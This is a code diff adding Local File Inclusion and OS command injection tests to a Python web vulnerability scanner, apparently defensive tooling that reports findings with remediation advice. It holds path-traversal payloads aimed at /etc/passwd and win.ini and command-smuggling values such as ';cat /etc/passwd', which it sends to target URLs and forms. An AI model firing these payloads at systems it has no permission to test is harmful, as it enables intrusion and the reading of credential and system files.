@@ -42,6 +42,17 @@ class VulnerabilityScanner:
             "driver",
             "execute query"
         ]
+
+        self.lfi_payloads = [
+            "../../../../etc/passwd",
+            "..\\..\\..\\..\\windows\\win.ini"
+        ]
+        
+        self.cmd_payloads = [
+            ";cat /etc/passwd",
+            ";ipconfig",
+            "|dir"
+        ]
         
         self.headers = {
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Vanguard/1.0"
@@ -115,6 +126,60 @@ class VulnerabilityScanner:
                     else:
                         continue
                     break # Break outer loop if finding was registered
+                except Exception:
+                    pass
+
+            # 3. Test for LFI
+            for payload in self.lfi_payloads:
+                modified_query = query_params.copy()
+                modified_query[param] = [payload]
+                
+                query_string = urlencode(modified_query, doseq=True)
+                test_url = urlunparse(parsed._replace(query=query_string))
+
+                try:
+                    res = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
+                    if "root:x:" in res.text or "[extensions]" in res.text or "[fonts]" in res.text:
+                        findings.append({
+                            "type": "Local File Inclusion (LFI)",
+                            "name": f"LFI in query param: '{param}'",
+                            "severity": "High",
+                            "url": url,
+                            "parameter": param,
+                            "payload": payload,
+                            "method": "GET",
+                            "description": f"Injecting file inclusion characters into '{param}' retrieved local system files. This indicates that file path inputs are read without proper sanitization.",
+                            "impact": "Attackers can read sensitive local files, such as configurations, credentials, or system logs, potentially leading to remote code execution.",
+                            "remediation": "Do not pass user inputs directly to file system operations. Use a strict allowlist of permitted files or refer to files by index keys."
+                        })
+                        break
+                except Exception:
+                    pass
+
+            # 4. Test for Command Injection
+            for payload in self.cmd_payloads:
+                modified_query = query_params.copy()
+                modified_query[param] = [payload]
+                
+                query_string = urlencode(modified_query, doseq=True)
+                test_url = urlunparse(parsed._replace(query=query_string))
+
+                try:
+                    res = requests.get(test_url, headers=self.headers, timeout=5, verify=False)
+                    if "root:x:" in res.text or "Windows IP Configuration" in res.text or "<DIR>" in res.text:
+                        findings.append({
+                            "type": "OS Command Injection",
+                            "name": f"Command Injection in query param: '{param}'",
+                            "severity": "Critical",
+                            "url": url,
+                            "parameter": param,
+                            "payload": payload,
+                            "method": "GET",
+                            "description": f"Injecting command shell operators into '{param}' resulted in the execution of system commands. Response matched known system command signatures.",
+                            "impact": "Allows attackers to run arbitrary system shell commands with the privileges of the web application service account.",
+                            "remediation": "Avoid invoking shell processes directly. Use programming APIs instead. Filter inputs using strict regex validation if shell utilities must be used."
+                        })
+                        break
                 except Exception:
                     pass
         
@@ -203,6 +268,70 @@ class VulnerabilityScanner:
                     else:
                         continue
                     break
+                except Exception:
+                    pass
+
+            # 3. Test LFI in Form
+            for payload in self.lfi_payloads:
+                data = {}
+                for inp in inputs:
+                    if inp["name"] == input_name:
+                        data[inp["name"]] = payload
+                    else:
+                        data[inp["name"]] = "test"
+
+                try:
+                    if method == "post":
+                        res = requests.post(action_url, data=data, headers=self.headers, timeout=5, verify=False)
+                    else:
+                        res = requests.get(action_url, params=data, headers=self.headers, timeout=5, verify=False)
+
+                    if "root:x:" in res.text or "[extensions]" in res.text or "[fonts]" in res.text:
+                        findings.append({
+                            "type": "Local File Inclusion (LFI)",
+                            "name": f"Form LFI in input: '{input_name}'",
+                            "severity": "High",
+                            "url": form["url"],
+                            "parameter": input_name,
+                            "payload": payload,
+                            "method": method.upper(),
+                            "description": f"The form field '{input_name}' is vulnerable to Local File Inclusion, permitting access to sensitive system files.",
+                            "impact": "Attackers can expose configuration files, environment secrets, or code files from the target machine.",
+                            "remediation": "Ensure database and file accesses utilize parameterized models rather than concatenating user input paths."
+                        })
+                        break
+                except Exception:
+                    pass
+
+            # 4. Test Command Injection in Form
+            for payload in self.cmd_payloads:
+                data = {}
+                for inp in inputs:
+                    if inp["name"] == input_name:
+                        data[inp["name"]] = payload
+                    else:
+                        data[inp["name"]] = "test"
+
+                try:
+                    if method == "post":
+                        res = requests.post(action_url, data=data, headers=self.headers, timeout=5, verify=False)
+                    else:
+                        res = requests.get(action_url, params=data, headers=self.headers, timeout=5, verify=False)
+
+                    if "root:x:" in res.text or "Windows IP Configuration" in res.text or "<DIR>" in res.text:
+                        findings.append({
+                            "type": "OS Command Injection",
+                            "name": f"Form Command Injection in input: '{input_name}'",
+                            "severity": "Critical",
+                            "url": form["url"],
+                            "parameter": input_name,
+                            "payload": payload,
+                            "method": method.upper(),
+                            "description": f"Injecting command shell operators into form field '{input_name}' resulted in code execution.",
+                            "impact": "Allows full server control, enabling data breach, pivot attacks, or ransomware.",
+                            "remediation": "Do not pass user inputs to shell commands or sub-processes without strict regex validation or system sandboxing."
+                        })
+                        break
                 except Exception:
                     pass
 
